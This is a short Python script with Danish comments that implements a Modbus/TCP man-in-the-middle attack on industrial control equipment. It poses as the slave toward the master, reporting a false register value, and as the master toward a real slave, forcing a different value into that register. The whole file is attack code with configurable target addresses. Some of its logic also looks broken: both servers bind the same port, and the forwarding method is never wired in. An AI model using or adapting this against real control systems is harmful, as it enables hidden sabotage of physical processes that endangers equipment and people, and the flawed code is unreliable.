#!/usr/bin/env python3
import threading
import sys
import time
from pymodbus.server.sync import StartTcpServer
from pymodbus.client.sync import ModbusTcpClient
from pymodbus.datastore import ModbusSlaveContext, ModbusServerContext
from pymodbus.datastore.datastore import ModbusSequentialDataBlock

# ═══════════════════════════════════════════════════════════════
# KONFIGURATION - TILPAS HER!
# ═══════════════════════════════════════════════════════════════
LISTEN_PORT = 502
TARGET_REGISTER = 2
FAKE_VALUE = 500        # Hvad MASTER SKAL SE på reg 2
FORCE_VALUE = 999       # Hvad REAL SLAVE FAKTISK FÅR skrevet

REAL_SLAVE_IP = "192.168.70.61"  # Din fysiske slave
REAL_SLAVE_PORT = 502

NETWORK = {
    'MASTER_IP': '172.16.4.50',
    'SLAVE_IP': '172.16.4.51', 
    'MITM_IP': '172.16.4.1'
}
# ═══════════════════════════════════════════════════════════════

class LogBlock(ModbusSequentialDataBlock):
    def __init__(self, address, values):
        super().__init__(address, values)
    
    def getValues(self, address, count=1):
        vals = super().getValues(address, count)
        print(f"🟢 [READ {self._name}] addr={address} -> {vals}")
        return vals

    def setValues(self, address, values):
        print(f"🔴 [WRITE {self._name}] addr={address} values={values}")
        super().setValues(address, values)
        return True

class MasterFacingSlave:  # Lytter på eth0 - prætenderer at være SLAVE
    def __init__(self):
        print("🤖 Starting FAKE SLAVE (for master)")
        block = LogBlock(0, [0] * 100)
        block.setValues(TARGET_REGISTER, [FAKE_VALUE])  # MASTER SER 500!
        block._name = "FAKE_SLAVE"
        store = ModbusSlaveContext(hr=block)
        self.context = ModbusServerContext(slaves=store, single=True)

class SlaveFacingMaster:  # Lytter på eth1 - prætenderer at være MASTER
    def __init__(self):
        print("👑 Starting FAKE MASTER (for real slave)")
        self.real_client = ModbusTcpClient(REAL_SLAVE_IP, port=REAL_SLAVE_PORT)
        if not self.real_client.connect():
            print(f"❌ Cannot connect to real slave {REAL_SLAVE_IP}:{REAL_SLAVE_PORT}")
            sys.exit(1)
        
        block = LogBlock(0, [0] * 100)
        block._name = "FAKE_MASTER"
        store = ModbusSlaveContext(hr=block)
        self.context = ModbusServerContext(slaves=store, single=True)

    def setValues(self, address, values):
        """Forward writes to REAL slave"""
        if address == TARGET_REGISTER:
            print(f"⚡ FORWARDING {FORCE_VALUE} to REAL slave HR[{TARGET_REGISTER}]")
            self.real_client.write_register(TARGET_REGISTER, FORCE_VALUE, unit=1)
        return super().setValues(address, values)

def start_master_facing():
    """Fake slave server - master tror den snakker med 172.16.4.51"""
    server = MasterFacingSlave()
    print(f"🌐 Fake Slave listening on 0.0.0.0:{LISTEN_PORT} (eth0 for {NETWORK['MASTER_IP']})")
    StartTcpServer(server.context, address=("0.0.0.0", LISTEN_PORT))

def start_slave_facing():
    """Fake master server - slave tror den snakker med 172.16.4.50"""  
    server = SlaveFacingMaster()
    print(f"🌐 Fake Master listening on 0.0.0.0:{LISTEN_PORT} (eth1 for {NETWORK['SLAVE_IP']})")
    StartTcpServer(server.context, address=("0.0.0.0", LISTEN_PORT))

if __name__ == "__main__":
    print("🚀 MODBUS MITM - Starting dual-facing servers...")
    print(f"   Master sees: {FAKE_VALUE} on reg {TARGET_REGISTER}")
    print(f"   Real slave gets: {FORCE_VALUE} written to reg {TARGET_REGISTER}")
    print(f"   Real slave: {REAL_SLAVE_IP}:{REAL_SLAVE_PORT}\n")
    
    # Start begge servers i parallel
    t1 = threading.Thread(target=start_master_facing, daemon=True)
    t2 = threading.Thread(target=start_slave_facing, daemon=True)
    
    t1.start()
    t2.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 Shutting down MITM...")
        sys.exit(0)